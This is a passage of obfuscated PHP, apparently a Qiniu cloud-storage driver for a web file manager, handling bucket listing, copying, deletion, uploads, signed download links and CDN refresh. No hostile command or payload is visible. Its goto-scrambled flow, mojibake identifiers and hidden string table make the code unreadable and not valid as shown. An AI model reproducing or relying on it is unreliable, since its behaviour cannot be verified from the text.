($fü≤∫ì∂ß€[$bÜ–ö Ê …[681]] == $bÜ–ö Ê …[2201] && $AÁ”ùÔû¨Î[$bÜ–ö Ê …[681]] == $bÜ–ö Ê …[2201]) { $bÂ®Ë˘¬„“[$bÜ–ö Ê …[681]] = 0; } goto B€‡øì∏Ô≤; båˆÎÑçáÓ: return $AÃÚ—óﬂÁ‰; goto aœÜÈÏ‹∫©; E∑‘î«Ô„‹: $bÜ–ö Ê … =& $_SERVER[Æ¡î¢≠¯™]; $Añç”∏Çáè = array($bÜ–ö Ê …[372] => $fü≤∫ì∂ß€[$bÜ–ö Ê …[372]]); $AÁ”ùÔû¨Î = Model($bÜ–ö Ê …[2195])->where($Añç”∏Çáè)->field($bÜ–ö Ê …[2204])->find(); goto D∂·êóã™¡; B€‡øì∏Ô≤: $AÃÚ—óﬂÁ‰ = Model($bÜ–ö Ê …[2195])->where($Añç”∏Çáè)->save($bÂ®Ë˘¬„“); if ($fü≤∫ì∂ß€[$bÜ–ö Ê …[681]] == $bÜ–ö Ê …[2200]) { if ($AÁ”ùÔû¨Î[$bÜ–ö Ê …[423]] != $bÜ–ö Ê …[472] && $this->shareFileMeta($AÁ”ùÔû¨Î[$bÜ–ö Ê …[423]])) { $this->shareFileMeta($AÁ”ùÔû¨Î[$bÜ–ö Ê …[423]], 0); } return $this->remove($AÁ”ùÔû¨Î[$bÜ–ö Ê …[445]]); } if ($AÃÚ—óﬂÁ‰ && $fü≤∫ì∂ß€[$bÜ–ö Ê …[681]] == $bÜ–ö Ê …[2201]) { $Bı’Ü∆ÊŸÉ = $bÂ®Ë˘¬„“[$bÜ–ö Ê …[681]] == $bÜ–ö Ê …[2201] ? 1 : 0; $this->shareFileMeta($AÁ”ùÔû¨Î[$bÜ–ö Ê …[423]], $Bı’Ü∆ÊŸÉ); $this->removeByFile($AÁ”ùÔû¨Î[$bÜ–ö Ê …[423]]); } goto båˆÎÑçáÓ; aœÜÈÏ‹∫©: } private function removeByFile($c≈ñ‡Ô°Ω«) { goto dÎÔõÙ¶Áù; Fœ§¢⁄Ü‰¡: $D‘À⁄Êä„≥ = array_to_keyvalue($b∏…‘Ü´ÿì, $fÖùıºáï§[33], $fÖùıºáï§[445]); $this->remove($D‘À⁄Êä„≥); goto F É§…™°ã; dÎÔõÙ¶Áù: $fÖùıºáï§ =& $_SERVER[Æ¡î¢≠¯™]; $b∏…‘Ü´ÿì = Model($fÖùıºáï§[744])->where(array($fÖùıºáï§[423] => $c≈ñ‡Ô°Ω«))->field($fÖùıºáï§[374])->select(); $A∂˜¨ß≤ ﬁ = array_to_keyvalue($b∏…‘Ü´ÿì, $fÖùıºáï§[33], $fÖùıºáï§[374]); goto A÷ÈÌœ¡Â…; A÷ÈÌœ¡Â…: $eàÌë€’¢¥ = array($fÖùıºáï§[374] => array($fÖùıºáï§[7], $A∂˜¨ß≤ ﬁ), $fÖùıºáï§[450] => 1); $b∏…‘Ü´ÿì = Model($fÖùıºáï§[2038])->where($eàÌë€’¢¥)->field($fÖùıºáï§[445])->select(); if (empty($b∏…‘Ü´ÿì)) { return; } goto Fœ§¢⁄Ü‰¡; F É§…™°ã: } private function shareFileMeta($Cπˆéàì…å, $c™·∏ü§àú = null) { $BﬂâÂΩü◊‘ =& $_SERVER[Æ¡î¢≠¯™]; $C›Ë˘Ì¬ù™ = array($BﬂâÂΩü◊‘[423] => $Cπˆéàì…å, $BﬂâÂΩü◊‘[99] => $BﬂâÂΩü◊‘[2205]); if (is_null($c™·∏ü§àú)) { return Model($BﬂâÂΩü◊‘[2206])->where($C›Ë˘Ì¬ù™)->find(); } $C›Ë˘Ì¬ù™[$BﬂâÂΩü◊‘[365]] = $c™·∏ü§àú; Model($BﬂâÂΩü◊‘[2206])->add($C›Ë˘Ì¬ù™, array(), !0); } } goto C©Ç£◊ïàﬁ; Dû“õÎäÁ»: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($B¢ÿûìÜ —) { parent::__construct(); require_once SDK_DIR . $_SERVER[Æ¡î¢≠¯™][1190]; $this->_init($B¢ÿûìÜ —); } public function _init($eﬂïÚô¯Ê¯) { foreach ($eﬂïÚô¯Ê¯ as $Bµö¢ıáß™ => $A¨…ãò†™¿) { if (isset($this->{$Bµö¢ıáß™})) { $this->{$Bµö¢ıáß™} = $A¨…ãò†™¿; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Æ¡î¢≠¯™][1191], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($cÇå≤Öø∫◊, $CÛûéùÇ∆≈ = '', $aÚ—Òå≥ÊÆ = REPEAT_RENAME) { if ($this->setContent($cÇå≤Öø∫◊, $CÛûéùÇ∆≈)) { return $this->getPathOuter($cÇå≤Öø∫◊); } return !1; } public function mkdir($eÉ¿—±ãø¡, $fÏãà‚ñ«∫ = REPEAT_SKIP) { goto dá´†ïÀëº; dÂ€ÈÖÏŸΩ: if (!$this->mkfile($F¥»ıÊ≠ÖÃ)) { return !1; } if (!$this->moveFile($F¥»ıÊ≠ÖÃ, $eÉ¿—±ãø¡)) { $this->delFile($F¥»ıÊ≠ÖÃ); return !1; } return $this->getPathOuter($eÒ∆–≈µ√ç); goto a–ﬂÚüÆÊ∑; dá´†ïÀëº: $eŒœ¨ã¿»é =& $_SERVER[Æ¡î¢≠¯™]; $eÒ∆–≈µ√ç = trim($eÉ¿—±ãø¡, $eŒœ¨ã¿»é[8]); if ($this->_isFolder($eÒ∆–≈µ√ç)) { return $this->getPathOuter($eÒ∆–≈µ√ç); } goto bÇ…åÕ—∫; bÇ…åÕ—∫: $eÉ¿—±ãø¡ = $eÒ∆–≈µ√ç . $eŒœ¨ã¿»é[8]; $c√ﬂÂÜ‚Ö = get_path_this($eÒ∆–≈µ√ç); $F¥»ıÊ≠ÖÃ = $eÉ¿—±ãø¡ . $c√ﬂÂÜ‚Ö; goto dÂ€ÈÖÏŸΩ; a–ﬂÚüÆÊ∑: } public function copyFile($d∞Úìñî®‘, $dÛ¬§◊µë⁄) { $bëî©ãâíò = $this->bucketManager->copy($this->bucket, $d∞Úìñî®‘, $this->bucket, $dÛ¬§◊µë⁄, !0); return $bëî©ãâíò ? !1 : !0; } public function moveFile($EÀ£∏‡ÍÑ‘, $E”ëàÌç∏û) { $b÷¿§È´∂° = $this->bucketManager->move($this->bucket, $EÀ£∏‡ÍÑ‘, $this->bucket, $E”ëàÌç∏û, !0); return $b÷¿§È´∂° ? !1 : !0; } public function delFile($dÔ÷Ïﬂü¥ˆ) { $C—Ì¡Ââ˘˜ = $this->bucketManager->delete($this->bucket, $dÔ÷Ïﬂü¥ˆ); return $C—Ì¡Ââ˘˜ ? !1 : !0; } public function delFolder($c’„’«î†ß) { $bÖ€âΩÚ”µ = $this->fileList($c’„’«î†ß); if (empty($bÖ€âΩÚ”µ)) { return !0; } $f‡ã≥ÈÔ™„ = 1000; if (count($bÖ€âΩÚ”µ) <= $f‡ã≥ÈÔ™„) { return $this->qnDelObj($bÖ€âΩÚ”µ) ? !1 : !0; } foreach (array_chunk($bÖ€âΩÚ”µ, $f‡ã≥ÈÔ™„) as $Aﬂü¨Á¨éÊ) { $f…îâ±ëŒó = $this->qnDelObj($Aﬂü¨Á¨éÊ); if ($f…îâ±ëŒó) { return !1; } } return !0; } private function qnDelObj($F‹·ïıÂäó) { $d≠‰ô‡ÊÇ¥ = $this->bucketManager->buildBatchDelete($this->bucket, $F‹·ïıÂäó); list($bÙÜàˆ¡⁄´, $a¥’Ω«ÒåÚ) = $this->bucketManager->batch($d≠‰ô‡ÊÇ¥); return $a¥’Ω«ÒåÚ; } private function fileList($Aá§ÊÉ∫ı∆, $cæñ∂È¯Ù› = 0) { goto b‰ﬁÖãƒÁì; AÑ„¶ëÿπâ: $f∞¬⁄†Ñî‘ = $e¥ﬂœ’”®ó[33]; $a∂∂†ô™Ì¯ = 1000; $E¡“èê∑Ç≠ = $e¥ﬂœ’”®ó[33]; goto e˜·˘›â§§; e˜·˘›â§§: $C´»Ëã–»Ç = array(); while (!0) { list($F‹∏≤†ÇßΩ, $D’¥·™Ò∂Ù) = $this->bucketManager->listFiles($this->bucket, $Cí§‰•ê†ä, $f∞¬⁄†Ñî‘, $a∂∂†ô™Ì¯, $E¡“èê∑Ç≠); if ($D’¥·™Ò∂Ù) { return !1; } $f∞¬⁄†Ñî‘ = array_key_exists($e¥ﬂœ’”®ó[1161], $F‹∏≤†ÇßΩ) ? $f∞¬⁄†Ñî‘ = $F‹∏≤†ÇßΩ[$e¥ﬂœ’”®ó[1192]] : $e¥ﬂœ’”®ó[33]; foreach ($F‹∏≤†ÇßΩ[$e¥ﬂœ’”®ó[1193]] as $cÔÚçåπ·∆) { $EƒÎ∫Î‚Œ¶ = $cÔÚçåπ·∆[$e¥ﬂœ’”®ó[99]]; if ($cæñ∂È¯Ù›) { $EƒÎ∫Î‚Œ¶ = array($e¥ﬂœ’”®ó[28] => $EƒÎ∫Î‚Œ¶, $e¥ﬂœ’”®ó[87] => $cÔÚçåπ·∆[$e¥ﬂœ’”®ó[1194]]); } $C´»Ëã–»Ç[] = $EƒÎ∫Î‚Œ¶; } if ($f∞¬⁄†Ñî‘ == $e¥ﬂœ’”®ó[33]) { break; } } return $C´»Ëã–»Ç; goto cﬁ“≈∏Æ¢À; b‰ﬁÖãƒÁì: $e¥ﬂœ’”®ó =& $_SERVER[Æ¡î¢≠¯™]; $Aá§ÊÉ∫ı∆ = trim($Aá§ÊÉ∫ı∆, $e¥ﬂœ’”®ó[8]); $Cí§‰•ê†ä = empty($Aá§ÊÉ∫ı∆) ? $e¥ﬂœ’”®ó[33] : $Aá§ÊÉ∫ı∆ . $e¥ﬂœ’”®ó[8]; goto AÑ„¶ëÿπâ; cﬁ“≈∏Æ¢À: } public function rename($bÆÜ©ı ÆÂ, $E∏Áî∆‚–“) { return $this->renameObject($bÆÜ©ı ÆÂ, $E∏Áî∆‚–“); } public function fileInfo($b€∂èëó∑ƒ, $c∞◊«∫«–“ = false, $D–ˆ∑Ò√ä¶ = array()) { goto E£œ≈±·Ñë; E£œ≈±·Ñë: $eûÓ§äàÖ =& $_SERVER[Æ¡î¢≠¯™]; if ($c∞◊«∫«–“) { return array($eûÓ§äàÖ[28] => $this->pathThis($b€∂èëó∑ƒ), $eûÓ§äàÖ[85] => $this->getPathOuter($eûÓ§äàÖ[8] . $b€∂èëó∑ƒ), $eûÓ§äàÖ[29] => $eûÓ§äàÖ[174], $eûÓ§äàÖ[87] => isset($D–ˆ∑Ò√ä¶[$eûÓ§äàÖ[1194]]) ? $D–ˆ∑Ò√ä¶[$eûÓ§äàÖ[1194]] : 0, $eûÓ§äàÖ[167] => $this->ext($b€∂èëó∑ƒ)); } $EÜ‰äÒ∑¯  = array($eûÓ§äàÖ[28] => $this->pathThis($b€∂èëó∑ƒ), $eûÓ§äàÖ[85] => $this->getPathOuter($eûÓ§äàÖ[8] . $b€∂èëó∑ƒ), $eûÓ§äàÖ[29] => $eûÓ§äàÖ[174], $eûÓ§äàÖ[194] => 0, $eûÓ§äàÖ[117] => 0, $eûÓ§äàÖ[87] => 0, $eûÓ§äàÖ[167] => $this->ext($b€∂èëó∑ƒ), $eûÓ§äàÖ[195] => !0, $eûÓ§äàÖ[196] => !0); goto FßÉÚıﬂä•; bûÇÆ∫ÖÎî: return $EÜ‰äÒ∑¯ ; goto FËß“ìÌÃë; FßÉÚıﬂä•: if (empty($D–ˆ∑Ò√ä¶)) { $D–ˆ∑Ò√ä¶ = $this->objectMeta($b€∂èëó∑ƒ); if (!$D–ˆ∑Ò√ä¶) { return $EÜ‰äÒ∑¯ ; } } if (isset($D–ˆ∑Ò√ä¶[$eûÓ§äàÖ[1195]])) { $EÜ‰äÒ∑¯ [$eûÓ§äàÖ[194]] = $D–ˆ∑Ò√ä¶[$eûÓ§äàÖ[1195]]; } if (isset($D–ˆ∑Ò√ä¶[$eûÓ§äàÖ[1194]])) { $EÜ‰äÒ∑¯ [$eûÓ§äàÖ[87]] = $D–ˆ∑Ò√ä¶[$eûÓ§äàÖ[1194]]; } goto bûÇÆ∫ÖÎî; FËß“ìÌÃë: } public function folderInfo($CÈ“©á´™ë, $Eåøçßá¿◊ = false) { goto DÇÑ…’ù∑≤; D≥è≤ÀçÍ¬: return $DÇï–µ∂Öó; goto Bè¯çÔµ‰Ö; DÇÑ…’ù∑≤: $cûÂÿãâùÊ =& $_SERVER[Æ¡î¢≠¯™]; if ($Eåøçßá¿◊) { return array($cûÂÿãâùÊ[28] => $this->pathThis($CÈ“©á´™ë), $cûÂÿãâùÊ[85] => $this->getPathOuter($cûÂÿãâùÊ[8] . $CÈ“©á´™ë), $cûÂÿãâùÊ[29] => $cûÂÿãâùÊ[86]); } $DÇï–µ∂Öó = array($cûÂÿãâùÊ[28] => $this->pathThis($CÈ“©á´™ë), $cûÂÿãâùÊ[85] => $this->getPathOuter($cûÂÿãâùÊ[8] . $CÈ“©á´™ë), $cûÂÿãâùÊ[29] => $cûÂÿãâùÊ[86], $cûÂÿãâùÊ[194] => 0, $cûÂÿãâùÊ[117] => 0, $cûÂÿãâùÊ[1140] => !0, $cûÂÿãâùÊ[1141] => !0); goto AüÎªüç’ô; AüÎªüç’ô: $CÈ“©á´™ë = rtrim($CÈ“©á´™ë, $cûÂÿãâùÊ[8]) . $cûÂÿãâùÊ[8]; $Eæ›•àÒ“¢ = $this->objectMeta($CÈ“©á´™ë); if (isset($Eæ›•àÒ“¢[$cûÂÿãâùÊ[1195]])) { $DÇï–µ∂Öó[$cûÂÿãâùÊ[194]] = $Eæ›•àÒ“¢[$cûÂÿãâùÊ[1195]]; } goto D≥è≤ÀçÍ¬; Bè¯çÔµ‰Ö: } public function listPath($Bﬂ»⁄∞‘Í›, $cÂÃ£ã‡ªÇ = false) { goto c∏Óÿ“◊ﬂ◊; eÌÜŸÜ™ºÊ: $fË±⁄èπÖﬂ = $dÏ–ø“∆ã = array(); while (!0) { list($f»ÔØ∑„§ƒ, $eˆ≈æü¬∆ö) = $this->bucketManager->listFiles($this->bucket, $f¶ëïΩ§ƒÑ, $A–∫Œ™à®•, $DÇ¢ˆøÈŒ∫, $eÖ¬∫Ã∂†¨); if ($eˆ≈æü¬∆ö) { return !1; } $A–∫Œ™à®• = array_key_exists($dπ∂≈åã†≈[1161], $f»ÔØ∑„§ƒ) ? $A–∫Œ™à®• = $f»ÔØ∑„§ƒ[$dπ∂≈åã†≈[1192]] : $dπ∂≈åã†≈[33]; if (isset($f»ÔØ∑„§ƒ[$dπ∂≈åã†≈[1196]])) { foreach ($f»ÔØ∑„§ƒ[$dπ∂≈åã†≈[1196]] as $Bı⁄ÑÚÀÂﬁ) { if ($Bı⁄ÑÚÀÂﬁ == $f¶ëïΩ§ƒÑ) { continue; } $fË±⁄èπÖﬂ[] = $this->folderInfo($Bı⁄ÑÚÀÂﬁ, $cÂÃ£ã‡ªÇ); } } if (isset($f»ÔØ∑„§ƒ[$dπ∂≈åã†≈[1193]])) { foreach ($f»ÔØ∑„§ƒ[$dπ∂≈åã†≈[1193]] as $EöµÇÖôæŒ) { if ($EöµÇÖôæŒ[$dπ∂≈åã†≈[99]] == $f¶ëïΩ§ƒÑ) { continue; } $dÏ–ø“∆ã[] = $this->fileInfo($EöµÇÖôæŒ[$dπ∂≈åã†≈[99]], $cÂÃ£ã‡ªÇ, $EöµÇÖôæŒ); } } if ($A–∫Œ™à®• == $dπ∂≈åã†≈[33]) { break; } } return array($dπ∂≈åã†≈[84] => $fË±⁄èπÖﬂ, $dπ∂≈åã†≈[83] => $dÏ–ø“∆ã); goto FÏ¨Ìÿü€π; eÊŸ≠•ÑÒª: $A–∫Œ™à®• = $dπ∂≈åã†≈[33]; $DÇ¢ˆøÈŒ∫ = 1000; $eÖ¬∫Ã∂†¨ = $dπ∂≈åã†≈[8]; goto eÌÜŸÜ™ºÊ; c∏Óÿ“◊ﬂ◊: $dπ∂≈åã†≈ =& $_SERVER[Æ¡î¢≠¯™]; $Bﬂ»⁄∞‘Í› = trim($Bﬂ»⁄∞‘Í›, $dπ∂≈åã†≈[8]); $f¶ëïΩ§ƒÑ = empty($Bﬂ»⁄∞‘Í›) ? $dπ∂≈åã†≈[33] : $Bﬂ»⁄∞‘Í› . $dπ∂≈åã†≈[8]; goto eÊŸ≠•ÑÒª; FÏ¨Ìÿü€π: } public function has($b€€çÁÈµ´, $E’¢öàı»§ = false, $A¶¶ÃÙØŒ„ = true) { goto A‡Æ»Üèﬂ∑; bò∆Êç÷√å: $d≠™⁄∏êÌå = 0; $AÀ’ÑâæÖº = 0; while (!0) { list($C⁄œÓÿ≠Û©, $AŸÙæÉæò∏) = $this->bucketManager->listFiles($this->bucket, $Eµëä‚·Ñ‘, $fàÜﬂáëà¶, $D·ô»éòë∏, $e∏·ëÒ∂ªﬂ); if ($AŸÙæÉæò∏) { return !1; } $fàÜﬂáëà¶ = array_key_exists($d´ÿü…≈√Ü[1161], $C⁄œÓÿ≠Û©) ? $fàÜﬂáëà¶ = $C⁄œÓÿ≠Û©[$d´ÿü…≈√Ü[1192]] : $d´ÿü…≈√Ü[33]; if ($E’¢öàı»§) { if (!empty($C⁄œÓÿ≠Û©[$d´ÿü…≈√Ü[1193]])) { $d≠™⁄∏êÌå += count($C⁄œÓÿ≠Û©[$d´ÿü…≈√Ü[1193]]); } if (!empty($C⁄œÓÿ≠Û©[$d´ÿü…≈√Ü[1196]])) { $AÀ’ÑâæÖº += count($C⁄œÓÿ≠Û©[$d´ÿü…≈√Ü[1196]]); } if ($fàÜﬂáëà¶ === $d´ÿü…≈√Ü[33]) { break; } continue; } if ($A¶¶ÃÙØŒ„) { if (!empty($C⁄œÓÿ≠Û©[$d´ÿü…≈√Ü[1193]])) { return !0; } } else { if (!empty($C⁄œÓÿ≠Û©[$d´ÿü…≈√Ü[1196]])) { return !0; } } if ($fàÜﬂáëà¶ == $d´ÿü…≈√Ü[33]) { break; } } goto D‰‚…Òœ⁄›; D‰‚…Òœ⁄›: if ($E’¢öàı»§) { return array($d´ÿü…≈√Ü[198] => $d≠™⁄∏êÌå, $d´ÿü…≈√Ü[199] => $AÀ’ÑâæÖº); } return !1; goto Bø‘ñùñ∏Û; EÏÑù´™ÓÌ: $fàÜﬂáëà¶ = $d´ÿü…≈√Ü[33]; $D·ô»éòë∏ = 1000; $e∏·ëÒ∂ªﬂ = $d´ÿü…≈√Ü[8]; goto bò∆Êç÷√å; A‡Æ»Üèﬂ∑: $d´ÿü…≈√Ü =& $_SERVER[Æ¡î¢≠¯™]; $b€€çÁÈµ´ = trim($b€€çÁÈµ´, $d´ÿü…≈√Ü[8]); $Eµëä‚·Ñ‘ = empty($b€€çÁÈµ´) ? $d´ÿü…≈√Ü[33] : $b€€çÁÈµ´ . $d´ÿü…≈√Ü[8]; goto EÏÑù´™ÓÌ; Bø‘ñùñ∏Û: } public function listAll($B≈º◊ÓÊ•Û) { $AÜ¯€©∫¢ú =& $_SERVER[Æ¡î¢≠¯™]; $e¿å‰¥ˆãó = $this->fileList($B≈º◊ÓÊ•Û, 1); $bÌüπó∫™≠ = array(); foreach ($e¿å‰¥ˆãó as $bÖÇï‘˘“â) { $bÌüπó∫™≠[$bÖÇï‘˘“â[$AÜ¯€©∫¢ú[28]]] = $bÖÇï‘˘“â[$AÜ¯€©∫¢ú[87]]; } return $this->listAllFiles($B≈º◊ÓÊ•Û, array_keys($bÌüπó∫™≠), $bÌüπó∫™≠); } public function canRead($DôÓ¶èæãç) { return $this->exist($DôÓ¶èæãç) ? !0 : !1; } public function canWrite($AøçëÏ∂“Ë) { return $this->exist($AøçëÏ∂“Ë) ? !0 : !1; } public function getContent($aÑË™é®·û) { return $this->fileSubstr($aÑË™é®·û, 0, -1); } public function setContent($EÖØ Ω†ùª, $c‰Îä÷ÖÇà = '') { $fê‘úøŸÖâ = $this->tempFile($this->pathThis($EÖØ Ω†ùª)); file_put_contents($fê‘úøŸÖâ, $c‰Îä÷ÖÇà); if ($this->upload($EÖØ Ω†ùª, $fê‘úøŸÖâ)) { $this->tempFileRemve($fê‘úøŸÖâ); return !0; } return !1; } public function refreshUrls($d§ÜÉ´»›√) { goto bµøåÆÒÆÈ; bÑ«öπ‚Ω£: return $a≈ò´êºú±[$F§üÖ¢ºÖÂ[1197]] == $F§üÖ¢ºÖÂ[688] ? !0 : !1; goto DÊπÃﬂëÁ•; dÀÓŒÖæ¶Ó: $dµÏÑÚêÑÀ = new Qiniu\Cdn\CdnManager($this->auth); list($a≈ò´êºú±, $aÙ‚âπä¿Õ) = $dµÏÑÚêÑÀ->refreshUrls($dàπêæÔ£ü); if ($aÙ‚âπä¿Õ) { return !1; } goto bÑ«öπ‚Ω£; bµøåÆÒÆÈ: $F§üÖ¢ºÖÂ =& $_SERVER[Æ¡î¢≠¯™]; $dàπêæÔ£ü = array(); if (is_array($d§ÜÉ´»›√)) { foreach ($d§ÜÉ´»›√ as $E«ó≥™æãΩ) { $dàπêæÔ£ü[] = $this->link($E«ó≥™æãΩ); } } else { $dàπêæÔ£ü[] = $this->link($d§ÜÉ´»›√); } goto dÀÓŒÖæ¶Ó; DÊπÃﬂëÁ•: } public function fileSubstr($a˜úÖà≈«”, $A¥á¯£´‡, $DÂŒÃﬁ˜∏û) { $aáûë‡∏£Ç =& $_SERVER[Æ¡î¢≠¯™]; if (!($AÁë¬≤†¶— = $this->link($a˜úÖà≈«”))) { return !1; } $bﬁ≥ÀêçŸ· = !1; if ($DÂŒÃﬁ˜∏û > 0) { $CÂè⁄´úç¯ = $A¥á¯£´‡ + $DÂŒÃﬁ˜∏û - 1; $bﬁ≥ÀêçŸ· = array($aáûë‡∏£Ç[1198] . $A¥á¯£´‡ . $aáûë‡∏£Ç[416] . $CÂè⁄´úç¯); } $f‘ôÀêåÍê = url_request($AÁë¬≤†¶—, $aáûë‡∏£Ç[223], !1, $bﬁ≥ÀêçŸ·); return $f‘ôÀêåÍê[$aáûë‡∏£Ç[681]] ? $f‘ôÀêåÍê[$aáûë‡∏£Ç[1020]] : !1; } public function upload($cπÂÍùÙüﬂ, $BÈÉ’±úäµ, $aî°Â≥Í§‘ = false, $DäÁÁ∑Óç˘ = REPEAT_REPLACE) { $D€«ˆ⁄·Ô¢ = new Qiniu\Storage\UploadManager(); $Aå¶πÛÜÖ” = $this->auth->uploadToken($this->bucket, $cπÂÍùÙüﬂ); $DÕÀ€⁄´â = get_file_mime(get_path_ext($BÈÉ’±úäµ)); list($Eä‹Ô‹æÑ¥, $AÜ’¢†æ±Î) = $D€«ˆ⁄·Ô¢->putFile($Aå¶πÛÜÖ”, $cπÂÍùÙüﬂ, $BÈÉ’±úäµ, null, $DÕÀ€⁄´â); return $AÜ’¢†æ±Î ? !1 : $this->getPathOuter($cπÂÍùÙüﬂ); } public function uploadFormData($bÖ®œë™Çë, $cü…õà√˘ﬂ = 3600) { return $this->uploadToken($bÖ®œë™Çë, $cü…õà√˘ﬂ); } public function multiUploadFormData($DÿõäÀó„ò, $D©ﬁäÈÜ‹¶ = 3600) { return $this->uploadToken($DÿõäÀó„ò, $D©ﬁäÈÜ‹¶); } private function uploadToken($BîîŸ⁄·∞∂, $aÛ»ˆ„‰á∞ = 3600) { goto EñßÍ¥◊ëõ; EñßÍ¥◊ëõ: $bœöáã•ß∂ =& $_SERVER[Æ¡î¢≠¯™]; $DÂØñÕÒ∆ = $aÛ»ˆ„‰á∞; $cÇ˜†èòëÛ = array($bœöáã•ß∂[1199] => $bœöáã•ß∂[1200]); goto EË“•πÊÁÜ; EË“•πÊÁÜ: $a¡†û’û˜ = null; $fÙè»ıÖ€Ê = $this->auth->uploadToken($this->bucket, $a¡†û’û˜, $DÂØñÕÒ∆, $cÇ˜†èòëÛ, !0); $Cª∞òÖìÂ¡ = empty($this->region) || $this->region == $bœöáã•ß∂[1201] ? $bœöáã•ß∂[33] : $bœöáã•ß∂[416] . $this->region; goto D°ùÁÂ‰©ä; D°ùÁÂ‰©ä: $díŸ¬ÉŒíá = http_type() . "\72\57\57\x75\x70\154\157\141\144{$Cª∞òÖìÂ¡}\56\161\x69\x6e\151\x75\x70\56\143\157\x6d\x2f"; return array($bœöáã•ß∂[1202] => $fÙè»ıÖ€Ê, $bœöáã•ß∂[1203] => $díŸ¬ÉŒíá); goto dç––⁄≠‰É; dç––⁄≠‰É: } public function download($DÜÛ«Ë†œñ, $Eéàß«Î∏≥) { goto BÏ≤Úû«ë≠; e˘•°Ç–àü: fclose($eó∑ëîõ ”); return $Eéàß«Î∏≥; goto dõîËíÂ•±; BöÑÕ€ıØ‚: $f∫óø¿»¡ê = 1024 * 200; $eó∑ëîõ ” = fopen($dî¡ÙÏ’‘, $_SERVER[Æ¡î¢≠¯™][1204]); while (!0) { $e÷ñ«ÂÜÑ = $this->fileSubstr($DÜÛ«Ë†œñ, $A©Ëã™Ö˜‚, $f∫óø¿»¡ê); if ($e÷ñ«ÂÜÑ === !1) { return !1; } fwrite($eó∑ëîõ ”, $e÷ñ«ÂÜÑ); $A©Ëã™Ö˜‚ += $f∫óø¿»¡ê; if (strlen($e÷ñ«ÂÜÑ) < $f∫óø¿»¡ê) { break; } } goto e˘•°Ç–àü; BÏ≤Úû«ë≠: $dî¡ÙÏ’‘ = IO::getPathInner(IO::mkfile($Eéàß«Î∏≥)); if (!($e¯Ñˆ√Ç–ì = $this->link($DÜÛ«Ë†œñ))) { return !1; } $A©Ëã™Ö˜‚ = 0; goto BöÑÕ€ıØ‚; dõîËíÂ•±: } public function link($bı¨ŒÌ¢ﬁ˘, $cæÑœ ‚´Ñ = '') { if (!$this->isFile($bı¨ŒÌ¢ﬁ˘)) { return !1; } $f¥¥•∑±êß = $this->getHost() . $_SERVER[Æ¡î¢≠¯™][8] . $this->pathEncode($bı¨ŒÌ¢ﬁ˘) . $cæÑœ ‚´Ñ; return $this->auth->privateDownloadUrl($f¥¥•∑±êß, 3600 * 12); } public function fileOut($cî•îØûË¨, $A◊âÌâò…Ì = false, $FÁ§Œõ›Àä = false, $a’çﬂê…›Ü = '') { $EªÉß˘çñ‡ =& $_SERVER[Æ¡î¢≠¯™]; if (!$FÁ§Œõ›Àä) { $FÁ§Œõ›Àä = $this->pathThis($cî•îØûË¨); } $F¡∂ß∂˘›Œ = $A◊âÌâò…Ì ? $EªÉß˘çñ‡[1205] . rawurlencode($FÁ§Œõ›Àä) : $EªÉß˘çñ‡[33]; $aŸëÁ€Ú–⁄ = $this->link($cî•îØûË¨, $F¡∂ß∂˘›Œ); $this->fileOutLink($aŸëÁ€Ú–⁄); } public function fileOutServer($DÌÉÂ€Ùßû, $bï°¢Ûïé” = false, $C›Ü”€¨∞∞ = false, $cºÍ‹ÖÙáò = '') { parent::fileOut($DÌÉÂ€Ùßû, $bï°¢Ûïé”, $C›Ü”€¨∞∞, $cºÍ‹ÖÙáò); } public function fileOutImage($cæ≥ﬂ›Ûîê, $dÎ§£ﬂÁË = 250) { $CÕÿú◊ô⁄á = $this->link($cæ≥ﬂ›Ûîê, $_SERVER[Æ¡î¢≠¯™][1206] . $dÎ§£ﬂÁË); $this->fileOutLink($CÕÿú◊ô⁄á); } public function fileOutImageServer($a≤ƒç˜®à¬, $DÌƒ…⁄ÎÎÍ = 250) { parent::fileOutImage($a≤ƒç˜®à¬, $DÌƒ…⁄ÎÎÍ); } public function hashMd5($Eéã∑ÿ…«) { $Fÿ¡´¥…É¥ =& $_SERVER[Æ¡î¢≠¯™]; $fÀÔ≈¯∑∏ª = $this->objectMeta($Eéã∑ÿ…«); return isset($fÀÔ≈¯∑∏ª[$Fÿ¡´¥…É¥[203]]) ? $fÀÔ≈¯∑∏ª[$Fÿ¡´¥…É¥[203]] : !1; $DÖﬁ¨È…ùË = $this->link($Eéã∑ÿ…«, $Fÿ¡´¥…É¥[1207]); } public function size($a∫Öˆïç©™) { $DÏ·≤ıÏıÌ = $this->objectMeta($a∫Öˆïç©™); return $DÏ·≤ıÏıÌ ? $DÏ·≤ıÏıÌ[$_SERVER[Æ¡î¢≠¯™][87]] : 0; } public function info($f´˘∏áÍÁÆ) { if ($this->isFolder($f´˘∏áÍÁÆ)) { return $this->folderInfo($f´˘∏áÍÁÆ); } else { if ($this->isFile($f´˘∏áÍÁÆ)) { return $this->fileInfo($f´˘∏áÍÁÆ); } } return !1; } public function exist($fî ÌÀñÎﬂ) { return $this->isFile($fî ÌÀñÎﬂ) || $this->isFolder($fî ÌÀñÎﬂ); } public function isFile($DÖ±ôåû◊˜) { return !$this->isFolder($DÖ±ôåû◊˜) && $this->objectMeta($DÖ±ôåû◊˜); } public function isFolder($FùáõáˆÙë) { return $this->cacheMethod($_SERVER[Æ¡î¢≠¯™][229], $FùáõáˆÙë); } protected function objectMeta($fÉ∂√Õì’·) { return $this->cacheMethod($_SERVER[Æ¡î¢≠¯™][230], $fÉ∂√Õì’·); } protected function _objectMeta($b’ıââñ¶à) { $Aπõ∂àÊû© =& $_SERVER[Æ¡î¢≠¯™]; list($AŸ≈ëè¨Á√, $B±Õıƒ´¥ä) = $this->bucketManager->stat($this->bucket, $b’ıââñ¶à); if ($AŸ≈ëè¨Á√) { $AŸ≈ëè¨Á√[$Aπõ∂àÊû©[87]] = 